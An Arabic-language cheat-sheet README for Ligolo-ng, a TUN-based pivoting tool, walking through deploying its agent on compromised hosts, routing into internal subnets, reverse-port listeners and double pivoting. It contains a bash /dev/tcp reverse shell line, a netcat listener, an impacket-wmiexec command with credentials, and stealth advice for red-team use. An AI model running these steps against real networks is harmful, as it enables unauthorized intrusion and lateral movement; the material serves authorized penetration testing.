<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="تمحور الشبكة">
</ص>

<p align="center">
  <b>🌐 أداة محورية حديثة وبسيطة وعالية الأداء تستخدم واجهات TUN بدلاً من بروكسيات SOCKS</b>
</ص>

---

## 📋 جدول المحتويات

- [المقدمة](#-المقدمة)
- [لماذا Ligolo-ng؟ (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
- [الهندسة المعمارية وكيف تعمل](#-الهندسة المعمارية--كيف-تعمل)
- [التثبيت](#-التثبيت)
- [دليل البدء السريع](#-دليل البدء السريع)
  - [الخطوة 1: إعداد واجهة TUN على المهاجم](#step-1-setup-tun-interface-on-attacker)
  - [الخطوة 2: بدء تشغيل وكيل Ligolo-ng](#step-2-start-the-ligolo-ng-proxy)
  - [الخطوة 3: نشر الوكيل على الهدف المحوري](#step-3-deploy-the-agent-on-pivot-target)
  - [الخطوة 4: تكوين التوجيه على المهاجم](#step-4-configure-routing-on-attacker)
  - [الخطوة 5: بدء جلسة النفق](#step-5-start-the-tunnel-session)
- [إعادة توجيه المنفذ العكسي (المستمعون)](#-reverse-port-forwarding-listeners)
- [المحور المزدوج (المحور متعدد الطبقات)](#-المحور المزدوج-المحور متعدد الطبقات)
- [مرجع أوامر الوكيل التفاعلية](#-proxy-interactive-commands-reference)
- [خيارات سطر أوامر الوكيل](#-خيارات-سطر أوامر الوكيل)
- [استكشاف الأخطاء وإصلاحها وأفضل الممارسات](#-استكشاف الأخطاء وإصلاحها--أفضل الممارسات)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
- [الموارد](#-الموارد)

---

## 🎯 المقدمة

**Ligolo-ng** عبارة عن أداة متقدمة وخفيفة الوزن وسريعة للنفق والدوران مكتوبة بلغة Go. على عكس بروكسيات SOCKS التقليدية (مثل التوجيه الديناميكي Chisel أو SSH القياسي)، ينشئ Ligolo-ng واجهة TUN افتراضية مباشرة على جهاز المهاجم الخاص بك.

يؤدي هذا إلى تحويل مضيفك المحوري المخترق إلى بوابة حقيقية تشبه VPN: يمكن لجميع الأدوات الموجودة على جهازك المهاجم (بما في ذلك `nmap -sS` و`crackmapexec` و`evil-winrm` و`impacket` والمتصفحات) الوصول إلى الشبكات الفرعية الداخلية مباشرة عن طريق عنوان IP دون بادئة الأوامر بـ `proxychains`.

---

## ⚖️ لماذا Ligolo-ng؟

| ميزة | ليجولو-نغ | سلاسل الوكلاء + الجوارب | جوارب SSH (`-D`) |
|---------|----------|--------------------|------------------|
| **دعم البروتوكول** | كامل TCP وUDP | TCP فقط (UDP ضعيف) | TCP فقط |
| **Nmap SYN Scan (`-sS`)**| ✅ نعم (أصلي) | ❌ لا (يتطلب TCP `-sT`) | ❌ لا |
| **توافق الأداة** | 100% (مكدس Kernel IP) | غير متناسق (LD_PRELOAD) | غير متناسق |
| **السرعة وزمن الوصول** | ⭐⭐⭐⭐⭐ سريع جدا | ⭐⭐⭐ معتدل | ⭐⭐⭐ معتدل |
| **لا يوجد غلاف جوارب** | ✅ نعم | ❌ يتطلب المجمع | ❌ يتطلب المجمع |
| ** المستمعون العكسيون ** | ✅ مدمج | ❌ يتطلب أداة منفصلة | ❌ محدودة |

---

## 🏗️ الهندسة المعمارية وكيف تعمل
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **الوكيل:** يعمل على جهاز المهاجم الخاص بك، ويدير الجلسات، ويربط الحزم بين واجهة TUN الافتراضية الخاصة بك والوكلاء المتصلين.
2. **Agent:** برنامج ثنائي خفيف الوزن يتم تنفيذه على الجهاز الداخلي المخترق (Linux أو Windows أو macOS أو ARM).
3. ** واجهة TUN: ** واجهة شبكة استرجاع البرامج التي تم إنشاؤها على Linux والتي توجه حركة المرور الموجهة للشبكات الفرعية الداخلية مباشرة إلى Ligolo.

---

## 📥 التثبيت

قم بتنزيل أحدث الإصدارات الثنائية لكل من **proxy** و **agent** من صفحة إصدارات GitHub الرسمية:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 دليل البدء السريع

### الخطوة 1: إعداد واجهة TUN على المهاجم

قبل تشغيل الوكيل، قم بإنشاء جهاز TUN ثابت على جهاز مهاجم Linux الخاص بك:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### الخطوة 2: ابدأ تشغيل وكيل Ligolo-ng

قم بتشغيل الوكيل باستخدام شهادات TLS الموقعة ذاتيًا:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **نصيحة:** يمكنك أيضًا تقديم شهادات Let's Encrypt صالحة باستخدام `-certfile` و`-keyfile` للتخفي في مشاركات الفريق الأحمر.

### الخطوة 3: نشر الوكيل على الهدف المحوري

انقل الوكيل إلى مضيفك المخترق وقم بتنفيذه:

#### على هدف Linux:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### على هدف Windows:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### الخطوة 4: تكوين التوجيه على المهاجم

بمجرد اتصال الوكيل، قم بفحص واجهات الشبكة الخاصة به من وحدة تحكم الوكيل لتحديد الشبكات الفرعية الداخلية للهدف (على سبيل المثال، `172.16.1.0/24`).

في **محطة المهاجم** (نافذة منفصلة)، أضف طريقًا يشير إلى واجهة TUN:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### الخطوة 5: ابدأ جلسة النفق

في موجه الوكيل Ligolo-ng التفاعلي:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
الآن لديك وصول مباشر ومباشر عبر IP إلى الشبكة الداخلية! اختبره:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 إعادة توجيه المنفذ العكسي (المستمعون)

هل ترغب في تلقي صدفة عكسية أو التقاط ترحيل مصادقة NTLM على صندوق المهاجم الخاص بك من مضيف داخلي لا يمكنه العودة إلى عنوان IP الخاص بالمهاجم؟ استخدم **المستمعين**!

عند تكوين مستمع في Ligolo-ng، يفتح الوكيل منفذ استماع على **الجهاز المحوري** ويعيد حركة المرور الواردة مرة أخرى إلى جهاز المهاجم.

### مثال: الإمساك بصدفة عكسية

داخل جلسة الوكيل:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
على **جهاز المهاجم**:
```bash
nc -lvnp 4444
```
على **هدف داخلي** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
يقوم المضيف المحوري بإعادة توجيه الاتصال مباشرة إلى مستمع Netcat الخاص بك!

---

## ⛓️ التمحور المزدوج (التمحور متعدد الطبقات)

عند الوصول إلى الشبكات المتداخلة بشدة (الشبكة الفرعية أ -> الشبكة الفرعية ب -> الشبكة الفرعية ج):

1. أنشئ نفقك الأولي إلى المحور 1 (`172.16.1.10`).
2. اكتشف Pivot 2 الموجود في الشبكة الفرعية B (`10.0.0.25`).
3. قم بإعداد المستمع على Pivot 1 لإعادة توجيه حركة المرور من الشبكة الفرعية B إلى منفذ الوكيل `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. انشر وكيل Ligolo على Pivot 2 واتصل بعنوان IP الخاص بـ Pivot 1:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. ستظهر جلسة ثانية في الوكيل الخاص بك! إضافة مسار للشبكة الفرعية C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. قم بالتبديل إلى الجلسة 2 واكتب `start`.

---

## ⌨️ مرجع أوامر الوكيل التفاعلية

| الأمر | الوصف | مثال |
|---------|------------|---------|
| `session` | قم بإدراج وتحديد جلسات الوكيل المتصلة النشطة | `session` |
| `start` | ابدأ في توجيه الحزم عبر العامل النشط | `start` |
| `stop` | إيقاف جلسة النفق النشطة | `stop` |
| `ifconfig` | إظهار واجهات الشبكة للوكيل المحدد | `ifconfig` |
| `listener_add` | قم بإنشاء منفذ استماع على الوكيل المحوري | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| قم بإدراج جميع المستمعين النشطين على الوكيل الحالي | `listener_list` |
| `listener_close`| إغلاق مستمع نشط محدد | `listener_close --id 0` |
| `help` | عرض تعليمات الأمر | `help` |
| `exit` | إنهاء الوكيل أو العودة إلى القائمة الرئيسية | `exit` |

---

## ⚙️ خيارات سطر أوامر الوكيل

| علم | الوصف | مثال |
|------|------------|---------|
| `-connect` | عنوان ومنفذ وكيل ليغولو | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | تخطي التحقق من شهادة TLS | `-ignore-cert` |
| `-retry` | إعادة محاولة الاتصال تلقائيًا في حالة قطع الاتصال | `-retry` |
| `-auto-clear` | مسح مخرجات المحطة عند التنفيذ | `-auto-clear` |

---

## 💡 استكشاف الأخطاء وإصلاحها وأفضل الممارسات

1. **حذف واجهة TUN بعد المشاركة:**
   عند الانتهاء من الاختبار، قم بتنظيف جدول التوجيه الخاص بك وحذف الواجهة الافتراضية:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **التحقق مرة أخرى من تداخلات الشبكة الفرعية لعنوان IP:**
   تأكد من أن الشبكة الفرعية الداخلية التي تقوم بتوجيهها (على سبيل المثال، `192.168.1.0/24`) لا تتعارض مع شبكة المهاجم المحلية الخاصة بك. إذا كان متداخلًا، فاستخدم مسار مضيف `/32` أكثر تحديدًا (على سبيل المثال، `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **اعتبارات جدار الحماية على المحور:**
   في أهداف Windows، تأكد من أن جدار حماية Windows Defender يسمح بالاتصالات الصادرة على المنفذ 11601 أو منفذ المستمع الذي اخترته.
4. **استخدم `-retry` في البيئات الحقيقية:**
   قم دائمًا بتشغيل الوكلاء باستخدام `-retry` لإعادة تأسيس الاتصالات تلقائيًا بعد انقطاع الشبكة العابرة.

---

## ⚠️إخلاء المسؤولية القانونية

> **هام:** Ligolo-ng هي أداة مساعدة قوية لتوجيه الشبكة. ويجب استخدامه فقط أثناء اختبارات الاختراق المصرح بها، وارتباطات الفريق الأحمر، وتقييمات الأمان الأخلاقية بموافقة كتابية صريحة.

---

## 📚 المصادر

- [مستودع Ligolo-ng GitHub الرسمي](https://github.com/nicocha30/ligolo-ng)
- [وثائق Ligolo-ng الرسمية](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)